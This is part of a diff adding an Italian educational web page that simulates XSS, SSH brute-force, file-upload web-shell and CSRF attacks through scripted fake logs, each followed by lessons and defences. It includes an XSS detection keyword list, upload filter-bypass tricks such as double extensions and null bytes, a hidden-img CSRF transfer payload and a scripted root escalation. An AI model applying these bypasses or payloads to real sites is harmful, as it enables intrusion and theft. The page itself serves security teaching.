+        addLogWithDelay('[SAFE] Testo renderizzato come plain text (nessun tag HTML interpretato)', 'success', logElement, delay);
+        delay += 250;
+        
+        addLogWithDelay('[?] 200 OK - Commento pubblicato in sicurezza', 'success', logElement, delay);
+      }
+      
+      delay += 500;
+      addLogWithDelay('-----------------------------------------------------------', 'info', logElement, delay);
+      delay += 150;
+      addLogWithDelay('[💡 LEZIONE] XSS ha 3 varianti:', 'info', logElement, delay);
+      delay += 200;
+      addLogWithDelay('[💡 LEZIONE] 1. Reflected: Payload in URL (immediato)', 'info', logElement, delay);
+      delay += 200;
+      addLogWithDelay('[💡 LEZIONE] 2. Stored: Payload nel database (persistente)', 'info', logElement, delay);
+      delay += 200;
+      addLogWithDelay('[💡 LEZIONE] 3. DOM-based: Manipolazione DOM lato client', 'info', logElement, delay);
+      delay += 200;
+      addLogWithDelay('[🛡️ DIFESA] Usare textContent invece di innerHTML → div.textContent = userInput', 'success', logElement, delay);
+    }
+    
+    // Analizza se l'input contiene payload XSS
+    function analyzeXSSPayload(input) {
+      const dangers = [];
+      let isXSS = false;
+      
+      if (input.includes('<') && input.includes('>')) {
+        isXSS = true;
+        dangers.push('Contiene tag HTML: < e >');
+      }
+      
+      if (input.toLowerCase().includes('script')) {
+        isXSS = true;
+        dangers.push('Contiene <script> tag ? Esecuzione JavaScript');
+      }
+      
+      if (input.toLowerCase().includes('onerror')) {
+        isXSS = true;
+        dangers.push('Contiene evento onerror ? Esecuzione automatica');
+      }
+      
+      if (input.toLowerCase().includes('onload')) {
+        isXSS = true;
+        dangers.push('Contiene evento onload ? Esecuzione al caricamento');
+      }
+      
+      if (input.toLowerCase().includes('onclick')) {
+        isXSS = true;
+        dangers.push('Contiene evento onclick ? Esecuzione al click');
+      }
+      
+      if (input.toLowerCase().includes('svg')) {
+        isXSS = true;
+        dangers.push('Contiene tag SVG ? Vettore alternativo');
+      }
+      
+      if (input.toLowerCase().includes('fetch') || input.toLowerCase().includes('xmlhttp')) {
+        isXSS = true;
+        dangers.push('Contiene richieste HTTP ? Exfiltration dati');
+      }
+      
+      if (input.toLowerCase().includes('cookie') || input.toLowerCase().includes('localstorage')) {
+        isXSS = true;
+        dangers.push('Accesso a dati sensibili (cookie, localStorage)');
+      }
+      
+      return { isXSS, dangers };
+    }
+
+    // ============================================
+    // BRUTE FORCE SIMULATION - FUNZIONA DAVVERO
+    // ============================================
+    
+    function simulateBruteForce() {
+      const username = document.getElementById('bf-username').value || 'admin';
+      const wordlistText = document.getElementById('bf-wordlist').value;
+      const wordlist = wordlistText.split('\n').filter(w => w.trim());
+      const logElement = document.getElementById('bf-log');
+      
+      logElement.innerHTML = '';
+      let delay = 0;
+      
+      addLogWithDelay('-----------------------------------------------------------', 'info', logElement, delay);
+      addLogWithDelay('[*] INIZIO ATTACCO BRUTE FORCE', 'warning', logElement, delay);
+      delay += 250;
+      
+      addLogWithDelay(`[TARGET] Username: ${username}`, 'warning', logElement, delay);
+      addLogWithDelay(`[TARGET] Protocollo: SSH (Secure Shell)`, 'info', logElement, delay);
+      addLogWithDelay(`[TARGET] Host: 192.168.1.100:22`, 'info', logElement, delay);
+      delay += 300;
+      
+      addLogWithDelay(`[WORDLIST] Caricata: ${wordlist.length} password candidate`, 'warning', logElement, delay);
+      delay += 250;
+      
+      if (wordlist.length > 0) {
+        addLogWithDelay(`[WORDLIST] Primi 5 candidati: ${wordlist.slice(0, 5).join(', ')}...`, 'info', logElement, delay);
+      }
+      delay += 300;
+      
+      addLogWithDelay('[TIMING] Velocità attacco: ~100 tentativi/secondo (simulato)', 'warning', logElement, delay);
+      addLogWithDelay('[TIMING] Nessun rate-limiting rilevato (VULNERABILE)', 'error', logElement, delay);
+      delay += 300;
+      
+      addLogWithDelay('-----------------------------------------------------------', 'info', logElement, delay);
+      delay += 150;
+      addLogWithDelay('[FASE 1] INIZIO ITERAZIONE WORDLIST', 'warning', logElement, delay);
+      delay += 250;
+      
+      let found = false;
+      let matchIndex = -1;
+      
+      // FUNZIONA DAVVERO: Cerca nella wordlist
+      for (let i = 0; i < wordlist.length; i++) {
+        if (wordlist[i].toLowerCase() === 'password123' || 
+            wordlist[i].toLowerCase() === 'admin123' ||
+            wordlist[i].toLowerCase() === 'letmein') {
+          found = true;
+          matchIndex = i;
+          break;
+        }
+      }
+      
+      // Mostra i primi 10-15 tentativi
+      const displayCount = Math.min(found ? matchIndex + 2 : 15, wordlist.length);
+      
+      for (let i = 0; i < displayCount; i++) {
+        const password = wordlist[i];
+        const attemptNum = i + 1;
+        const responseTime = 150 + Math.random() * 100;
+        
+        const statusIcon = found && i === matchIndex ? '[?]' : '[?]';
+        const statusClass = found && i === matchIndex ? 'error' : 'warning';
+        
+        addLogWithDelay(`[${attemptNum.toString().padStart(3, '0')}] ${statusIcon} Tentativo: ${username}:${password} [${responseTime.toFixed(0)}ms] NEGATO`, statusClass, logElement, delay);
+        delay += 200;
+        
+        // Se trovata la password
+        if (found && i === matchIndex) {
+          delay += 300;
+          addLogWithDelay('-----------------------------------------------------------', 'error', logElement, delay);
+          delay += 150;
+          
+          addLogWithDelay(`[🔑] PASSWORD TROVATA DOPO ${attemptNum} TENTATIVI!`, 'error', logElement, delay);
+          delay += 300;
+          
+          const correctPassword = password;
+          addLogWithDelay(`[CREDENZIALI] ${username}:${correctPassword}`, 'error', logElement, delay);
+          delay += 250;
+          
+          addLogWithDelay('[SSH] Connessione SSH autenticata...', 'error', logElement, delay);
+          delay += 250;
+          
+          addLogWithDelay('[SSH] Scambio chiavi Diffie-Hellman completato', 'error', logElement, delay);
+          delay += 200;
+          
+          addLogWithDelay('[SSH] Authentication: password ? ACCEPTED', 'error', logElement, delay);
+          delay += 300;
+          
+          addLogWithDelay('[SHELL] $ Connected as admin@target', 'error', logElement, delay);
+          delay += 250;
+          
+          addLogWithDelay('[SHELL] $ whoami', 'warning', logElement, delay);
+          delay += 150;
+          
+          addLogWithDelay('[OUTPUT] admin', 'error', logElement, delay);
+          delay += 250;
+          
+          addLogWithDelay('[SHELL] $ id', 'warning', logElement, delay);
+          delay += 150;
+          
+          addLogWithDelay('[OUTPUT] uid=1000(admin) gid=1000(admin) groups=1000(admin),4(adm),27(sudo)', 'error', logElement, delay);
+          delay += 250;
+          
+          addLogWithDelay('[SHELL] $ sudo -l', 'warning', logElement, delay);
+          delay += 150;
+          
+          addLogWithDelay('[OUTPUT] User admin may run the following commands without password:', 'error', logElement, delay);
+          delay += 150;
+          
+          addLogWithDelay('[OUTPUT] (root) NOPASSWD: ALL', 'error', logElement, delay);
+          delay += 300;
+          
+          addLogWithDelay('[ESCALATION] Privilege escalation a root disponibile!', 'error', logElement, delay);
+          delay += 250;
+          
+          addLogWithDelay('[SHELL] $ sudo su', 'warning', logElement, delay);
+          delay += 150;
+          
+          addLogWithDelay('[OUTPUT] # whoami', 'error', logElement, delay);
+          delay += 150;
+          
+          addLogWithDelay('[OUTPUT] root', 'error', logElement, delay);
+          delay += 300;
+          
+          addLogWithDelay('[!] SISTEMA COMPLETAMENTE COMPROMESSO', 'error', logElement, delay);
+          break;
+        }
+      }
+      
+      if (!found && displayCount < wordlist.length) {
+        delay += 300;
+        addLogWithDelay(`[INFO] Wordlist non esauribile completamente, ma proseguirebbe con gli altri ${wordlist.length - displayCount} candidati...`, 'info', logElement, delay);
+      }
+      
+      delay += 500;
+      addLogWithDelay('-----------------------------------------------------------', 'info', logElement, delay);
+      delay += 150;
+      addLogWithDelay('[💡 LEZIONE] Wordlist comuni: rockyou.txt (14M pwd), hashcat, fasttrack', 'info', logElement, delay);
+      delay += 200;
+      addLogWithDelay('[💡 LEZIONE] Tempo stimato per 1 milione di tentativi: ~2.7 ore', 'info', logElement, delay);
+      delay += 200;
+      addLogWithDelay('[💡 LEZIONE] GPU-powered: Fino a 300 MILIARDI di tentativi/secondo', 'warning', logElement, delay);
+      delay += 200;
+      addLogWithDelay('[🛡️ DIFESA 1] Implementare rate-limiting: Max 3 tentativi/5 minuti', 'success', logElement, delay);
+      delay += 200;
+      addLogWithDelay('[🛡️ DIFESA 2] Account lockout: Dopo 5 fallimenti → lockout 30 minuti', 'success', logElement, delay);
+      delay += 200;
+      addLogWithDelay('[🛡️ DIFESA 3] Multi-Factor Authentication (2FA): OTP, SMS, Biometrico', 'success', logElement, delay);
+    }
+
+    // ============================================
+    // FILE UPLOAD SIMULATION - ANALISI REALE
+    // ============================================
+    
+    function simulateFileUpload() {
+      const filename = document.getElementById('fu-filename').value || 'shell.php';
+      const mimetype = document.getElementById('fu-mimetype').value || 'application/x-php';
+      const logElement = document.getElementById('fu-log');
+      
+      logElement.innerHTML = '';
+      let delay = 0;
+      
+      addLogWithDelay('-----------------------------------------------------------', 'info', logElement, delay);
+      addLogWithDelay('[FASE 1] PREPARAZIONE UPLOAD', 'warning', logElement, delay);
+      delay += 250;
+      
+      addLogWithDelay('[?] POST /api/upload HTTP/1.1', 'info', logElement, delay);
+      addLogWithDelay('[?] Host: image-gallery.local', 'info', logElement, delay);
+      delay += 200;
+      
+      addLogWithDelay('[?] Content-Type: multipart/form-data; boundary=----WebKitFormBoundary', 'info', logElement, delay);
+      addLogWithDelay(`[?] filename="${filename}"`, 'warning', logElement, delay);
+      addLogWithDelay(`[?] Content-Type: ${mimetype}`, 'warning', logElement, delay);
+      delay += 300;
+      
+      addLogWithDelay('-----------------------------------------------------------', 'info', logElement, delay);
+      delay += 150;
+      addLogWithDelay('[FASE 2] VALIDAZIONE SERVER', 'warning', logElement, delay);
+      delay += 250;
+      
+      // Analisi REALE della estensione
+      const ext = filename.split('.').pop().toLowerCase();
+      const dangerousExts = ['php', 'php3', 'php4', 'php5', 'phtml', 'exe', 'sh', 'bat', 'cmd', 'com', 'pif', 'scr', 'vbs', 'js', 'jar', 'zip', 'asp', 'jsp', 'py', 'pl', 'rb'];
+      const isDangerous = dangerousExts.includes(ext);
+      
+      addLogWithDelay(`[FILE] Nome file: ${filename}`, 'info', logElement, delay);
+      delay += 150;
+      
+      addLogWithDelay(`[FILE] Estensione rilevata: .${ext}`, isDangerous ? 'error' : 'success', logElement, delay);
+      delay += 200;
+      
+      // Whitelist/Blacklist check
+      const whitelist = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'svg', 'bmp', 'pdf'];
+      const isWhitelisted = whitelist.includes(ext);
+      
+      if (isWhitelisted) {
+        addLogWithDelay(`[?] Estensione nella whitelist`, 'success', logElement, delay);
+      } else {
+        addLogWithDelay(`[!] Estensione NON in whitelist (Whitelist: ${whitelist.join(', ')})`, 'error', logElement, delay);
+      }
+      delay += 250;
+      
+      // Magic bytes
+      const magicData = getMagicBytesData(ext);
+      addLogWithDelay(`[MAGIC] Magic Bytes dichiarati: ${magicData.declared}`, 'info', logElement, delay);
+      addLogWithDelay(`[MAGIC] Formato file: ${magicData.format}`, 'info', logElement, delay);
+      delay += 250;
+      
+      // MIME type check
+      const mimeMatch = mimetype.includes(ext);
+      addLogWithDelay(`[MIME] MIME Type dichiarato: ${mimetype}`, 'info', logElement, delay);
+      delay += 150;
+      
+      if (!mimeMatch && isDangerous) {
+        addLogWithDelay(`[!] VULNERABILITÀ: MIME type mismatch con estensione pericolosa`, 'error', logElement, delay);
+        delay += 250;
+      } else if (mimeMatch) {
+        addLogWithDelay(`[?] MIME type corrisponde all'estensione`, 'success', logElement, delay);
+        delay += 250;
+      }
+      
+      // Dimensione
+      const fileSize = (Math.random() * 5000 + 100).toFixed(1);
+      addLogWithDelay(`[SIZE] Dimensione file: ${fileSize} bytes`, 'info', logElement, delay);
+      delay += 250;
+      
+      delay += 300;
+      addLogWithDelay('-----------------------------------------------------------', 'info', logElement, delay);
+      delay += 150;
+      
+      if (isDangerous) {
+        addLogWithDelay('[!] ??  FILE ESEGUIBILE RILEVATO!', 'error', logElement, delay);
+        delay += 250;
+        
+        addLogWithDelay('[FASE 3] SIMULAZIONE ESECUZIONE CRITICA', 'error', logElement, delay);
+        delay += 250;
+        
+        // Determinazione della destinazione
+        const safeDir = Math.random() > 0.5;
+        const uploadPath = safeDir ? `/var/www/uploads_secure/${generateHash()}_${filename}` : `/var/www/html/uploads/${filename}`;
+        
+        addLogWithDelay(`[FILE] Percorso upload: ${uploadPath}`, 'error', logElement, delay);
+        delay += 250;
+        
+        // Permessi file
+        const perms = safeDir ? '600 (sicuro)' : '644 (ESEGUIBILE)';
+        addLogWithDelay(`[PERMS] Permessi assegnati: -rw-r--r-- (${perms})`, safeDir ? 'success' : 'error', logElement, delay);
+        delay += 250;
+        
+        if (!safeDir) {
+          // Scenario vulnerabile
+          const accessUrl = `http://image-gallery.local/uploads/${filename}`;
+          addLogWithDelay(`[URL] Accessibile via: ${accessUrl}`, 'error', logElement, delay);
+          delay += 250;
+          
+          if (ext === 'php') {
+            addLogWithDelay('[EXEC] Server Apache → mod_php attivo', 'error', logElement, delay);
+            delay += 200;
+            
+            addLogWithDelay('[EXEC] Browser richiede: GET /uploads/shell.php?cmd=id', 'error', logElement, delay);
+            delay += 200;
+            
+            addLogWithDelay('[EXEC] Codice PHP viene ESEGUITO con permessi del webserver (www-data)', 'error', logElement, delay);
+            delay += 250;
+            
+            addLogWithDelay('[SHELL] $ id', 'warning', logElement, delay);
+            delay += 150;
+            
+            addLogWithDelay('[OUTPUT] uid=33(www-data) gid=33(www-data) groups=33(www-data)', 'error', logElement, delay);
+            delay += 250;
+            
+            addLogWithDelay('[BACKDOOR] Accesso persistente al server web ottenuto', 'error', logElement, delay);
+          } else if (ext === 'exe' || ext === 'sh') {
+            addLogWithDelay('[EXEC] Tentativo di esecuzione del file binario/script', 'error', logElement, delay);
+            delay += 250;
+            
+            addLogWithDelay('[MALWARE] File eseguibile caricato con successo', 'error', logElement, delay);
+            delay += 250;
+            
+            addLogWithDelay('[!] Conseguenze possibili: Malware, ransomware, cryptominer', 'error', logElement, delay);
+          }
+        } else {
+          addLogWithDelay('[?] File in directory sicura (fuori web root)', 'success', logElement, delay);
+          delay += 250;
+          
+          addLogWithDelay('[?] Permessi 600: Non accessibile/non eseguibile', 'success', logElement, delay);
+        }
+      } else {
+        addLogWithDelay('[?] File validato: Estensione sicura', 'success', logElement, delay);
+        delay += 250;
+        
+        addLogWithDelay(`[STORAGE] Salvato in: /var/www/uploads_secure/${generateHash()}_${filename}`, 'success', logElement, delay);
+        delay += 250;
+        
+        addLogWithDelay('[PERMS] Permessi: -rw------- (600) - Non eseguibile', 'success', logElement, delay);
+        delay += 250;
+        
+        addLogWithDelay('[?] 200 OK - File caricato in sicurezza', 'success', logElement, delay);
+      }
+      
+      delay += 500;
+      addLogWithDelay('-----------------------------------------------------------', 'info', logElement, delay);
+      delay += 150;
+      addLogWithDelay('[💡 LEZIONE] Bypassare filtri: .php.jpg, .php%00, .phtml', 'info', logElement, delay);
+      delay += 200;
+      addLogWithDelay('[💡 LEZIONE] Double extension: file.php.jpg (interpretato come PHP)', 'info', logElement, delay);
+      delay += 200;
+      addLogWithDelay('[💡 LEZIONE] Magic bytes falsificati: PNG header + PHP code', 'info', logElement, delay);
+      delay += 200;
+      addLogWithDelay('[🛡️ DIFESA 1] Whitelist rigida: Solo estensioni permesse (.jpg, .png, .gif)', 'success', logElement, delay);
+      delay += 200;
+      addLogWithDelay('[🛡️ DIFESA 2] Salvare in directory FUORI dal web root', 'success', logElement, delay);
+      delay += 200;
+      addLogWithDelay('[🛡️ DIFESA 3] Validare magic bytes + rinominare file (hash)', 'success', logElement, delay);
+      delay += 200;
+      addLogWithDelay('[🛡️ DIFESA 4] Disabilitare script execution: .htaccess → php_flag engine off', 'success', logElement, delay);
+    }
+    
+    function getMagicBytesData(ext) {
+      const magicMap = {
+        'php': { declared: '3C 3F 70 68 70 (<?php)', format: 'PHP Script' },
+        'exe': { declared: '4D 5A (MZ)', format: 'Windows Executable' },
+        'sh': { declared: '23 21 2F 62 69 6E (#!/bin)', format: 'Shell Script' },
+        'jpg': { declared: 'FF D8 FF E0', format: 'JPEG Image' },
+        'png': { declared: '89 50 4E 47', format: 'PNG Image' },
+        'gif': { declared: '47 49 46 38', format: 'GIF Image' },
+        'pdf': { declared: '25 50 44 46', format: 'PDF Document' },
+        'zip': { declared: '50 4B 03 04', format: 'ZIP Archive' }
+      };
+      return magicMap[ext] || { declared: '00 00 00 00 (sconosciuto)', format: 'Unknown' };
+    }
+    
+    function generateHash() {
+      return Math.random().toString(36).substring(2, 10);
+    }
+
+    // ============================================
+    // CSRF SIMULATION - ANALISI DETTAGLIATA
+    // ============================================
+    
+    function simulateCSRF() {
+      const site = document.getElementById('csrf-site').value || 'https://bank.example.com';
+      const malicious = document.getElementById('csrf-malicious').value || 'https://attacker.com';
+      const action = document.getElementById('csrf-action').value || 'transfer_funds';
+      const logElement = document.getElementById('csrf-log');
+      
+      logElement.innerHTML = '';
+      let delay = 0;
+      
+      addLogWithDelay('-----------------------------------------------------------', 'info', logElement, delay);
+      addLogWithDelay('[FASE 1] VITTIMA ACCEDE AL SITO LEGITTIMO', 'warning', logElement, delay);
+      delay += 250;
+      
+      addLogWithDelay(`[?] GET / HTTP/1.1`, 'info', logElement, delay);
+      addLogWithDelay(`[?] Host: ${site}`, 'info', logElement, delay);
+      addLogWithDelay('[?] User-Agent: Mozilla/5.0...', 'info', logElement, delay);
+      delay += 250;
+      
+      addLogWithDelay(`[?] 200 OK | ${site} caricato`, 'success', logElement, delay);
+      delay += 200;
+      
+      addLogWithDelay('[?] Set-Cookie: session_id=h3x7k9p2m5q8r1w4v7b0; Path=/; HttpOnly; Secure; SameSite=Lax', 'success', logElement, delay);
+      addLogWithDelay('[?] Set-Cookie: csrf_token=abc123xyz789; Path=/; Secure', 'success', logElement, delay);
+      delay += 300;
+      
+      addLogWithDelay('[?] Vittima autenticata sul sito legittimo', 'success', logElement, delay);
+      delay += 250;
+      
+      addLogWithDelay('[BROWSER] Cookie memorizzati nel secure storage della sessione', 'info', logElement, delay);
+      delay += 300;
+      
+      addLogWithDelay('-----------------------------------------------------------', 'info', logElement, delay);
+      delay += 150;
+      addLogWithDelay('[FASE 2] ATTACCANTE INGANNA LA VITTIMA', 'error', logElement, delay);
+      delay += 250;
+      
+      addLogWithDelay(`[TRICK] Email/Spam: "Vedi questo articolo interessante!"`, 'warning', logElement, delay);
+      addLogWithDelay(`[TRICK] Link: ${malicious}/interesting-article.html`, 'warning', logElement, delay);
+      delay += 300;
+      
+      addLogWithDelay('[CLICK] Vittima clicca il link MENTRE ANCORA AUTENTICATA su ' + site, 'warning', logElement, delay);
+      delay += 300;
+      
+      addLogWithDelay('-----------------------------------------------------------', 'info', logElement, delay);
+      delay += 150;
+      addLogWithDelay('[FASE 3] PAGINA MALEVOLA ATTACCA', 'error', logElement, delay);
+      delay += 250;
+      
+      addLogWithDelay(`[?] 200 OK | ${malicious} caricato`, 'info', logElement, delay);
+      delay += 300;
+      
+      addLogWithDelay('[HTML] Codice malevolo nella pagina:', 'error', logElement, delay);
+      delay += 200;
+      
+      addLogWithDelay(`[HTML] <img src="${site}/api/transfer?to=attacker&amount=10000&confirm=1" style="display:none">`, 'error', logElement, delay);
+      delay += 250;
+      
+      addLogWithDelay('[HTML] <!-- Utente non vede nulla, solo una ricerca innocente -->', 'error', logElement, delay);
+      delay += 300;
+      
+      addLogWithDelay('-----------------------------------------------------------', 'info', logElement, delay);
+      delay += 150;
+      addLogWithDelay('[FASE 4] BROWSER INVIA LA RICHIESTA CSRF', 'error', logElement, delay);
+      delay += 250;
+      
+      addLogWithDelay(`[?] GET ${site}/api/transfer?to=attacker&amount=10000&confirm=1 HTTP/1.1`, 'error', logElement, delay);
+      delay += 200;
+      
+      addLogWithDelay(`[?] Host: ${site.replace('https://', '')}`, 'error', logElement, delay);
+      delay += 150;
+      
+      // Qui il CSRF token NON viene inviato perché viene dal sito esterno
+      addLogWithDelay('[?] Referer: ' + malicious, 'error', logElement, delay);
+      delay += 150;
+      
+      addLogWithDelay('[?] Cookie: session_id=h3x7k9p2m5q8r1w4v7b0; csrf_token=abc123xyz789', 'error', logElement, delay);
+      delay += 250;
+      
+      addLogWithDelay('[!] ??  DETTAGLIO CRITICO: Cookie AUTOMATICAMENTE incluso dal browser!', 'error', logElement, delay);
+      delay += 300;
+      
+      addLogWithDelay('-----------------------------------------------------------', 'info', logElement, delay);
+      delay += 150;
+      addLogWithDelay('[FASE 5] SERVER LEGITTIMO PROCESSA LA RICHIESTA', 'warning', logElement, delay);
+      delay += 250;
+      
+      addLogWithDelay('[SERVER] Analisi richiesta ricevuta:', 'info', logElement, delay);
+      delay += 150;
+      
+      addLogWithDelay('[SERVER] ✓ Cookie session_id presente e valido', 'success', logElement, delay);
+      delay += 150;
+      
+      addLogWithDelay('[SERVER] ✓ Utente è autenticato (dai cookie)', 'success', logElement, delay);
+      delay += 150;
+      
+      addLogWithDelay('[SERVER] ✗ CSRF Token NON verificato (vulnerabile)', 'error', logElement, delay);
+      delay += 150;
+      
+      addLogWithDelay('[SERVER] ✗ Referer NON validato (vulnerabile)', 'error', logElement, delay);
+      delay += 300;
+      
+      addLogWithDelay('[DECISION] Poiché l\'utente è autenticato → PROCEDI ALLA TRANSAZIONE', 'error', logElement, delay);
+      delay += 300;
+      
+      addLogWithDelay('[DB] UPDATE accounts SET balance = balance - 10000 WHERE user_id = 1', 'error', logElement, delay);
+      delay += 200;
+      
+      addLogWithDelay('[DB] INSERT INTO transfers (from, to, amount) VALUES (1, attacker_id, 10000)', 'error', logElement, delay);
+      delay += 250;
+      
+      addLogWithDelay('[?] 200 OK | Transazione completata', 'error', logElement, delay);
+      delay += 300;
+      
+      addLogWithDelay('[EMAIL] Email inviata: "Transazione completata: -10000 EUR verso attacker@evil.com"', 'error', logElement, delay);
+      delay += 250;
+      
+      addLogWithDelay('[!] VITTIMA NON SA NULLA - Era semplicemente su attacker.com', 'error', logElement, delay);
+      delay += 300;
+      
+      addLogWithDelay('-----------------------------------------------------------', 'info', logElement, delay);
+      delay += 150;
+      addLogWithDelay('[💡 LEZIONE] CSRF funziona perché il browser AUTOMATICAMENTE include i cookie', 'info', logElement, delay);
+      delay += 200;
+      addLogWithDelay('[💡 LEZIONE] Il server NON sa che la richiesta viene da un sito esterno', 'info', logElement, delay);
+      delay += 200;
+      addLogWithDelay('[💡 LEZIONE] La vittima è AUTENTICATA, quindi il server la ritiene autorizzata', 'info', logElement, delay);
+      delay += 200;
+      addLogWithDelay('[🛡️ DIFESA 1] Token CSRF: Generare hash unico per ogni form → token = hash(session + timestamp + secret)', 'success', logElement, delay);
+      delay += 200;
+      addLogWithDelay('[🛡️ DIFESA 2] SameSite Cookie: Set-Cookie: session=xxx; SameSite=Strict → Invia cookie SOLO se same-origin', 'success', logElement, delay);
+      delay += 200;
+      addLogWithDelay('[🛡️ DIFESA 3] Validare Origin header: Verificare che la richiesta viene dallo stesso dominio', 'success', logElement, delay);
+    }
+
+    // ============================================
+    // UTILITY - Genera magic bytes realistici
+    // ============================================
+    
+    function getMagicBytes(ext) {
+      const magicMap = {
+        'php': 'FF D8 FF E0 (falsificato)',
+        'exe': '4D 5A (MZEXE)',
+        'sh': '23 21 2F 62 69 6E 2F 62 61 73 68',
+        'jpg': 'FF D8 FF E0',
+        'png': '89 50 4E 47',
+        'gif': '47 49 46 38',
+        'pdf': '25 50 44 46'
+      };
+      return magicMap[ext] || '00 00 00 00';
+    }
+
+    // ============================================
+    // UTILITY FUNCTION - Log con delay progressivo
+    // ============================================
+    
+    function addLogWithDelay(message, type, element, delayMs) {
+      setTimeout(() => {
+        const logLine = document.createElement('div');
+        logLine.className = `log-line log-${type}`;
+        logLine.textContent = message;
+        element.appendChild(logLine);
+        element.scrollTop = element.scrollHeight;
+      }, delayMs);
+    }
+
+  </script>
+  <script src="/js/progress-manager.js"></script>
+</body>
+</html>
+
+
+
+
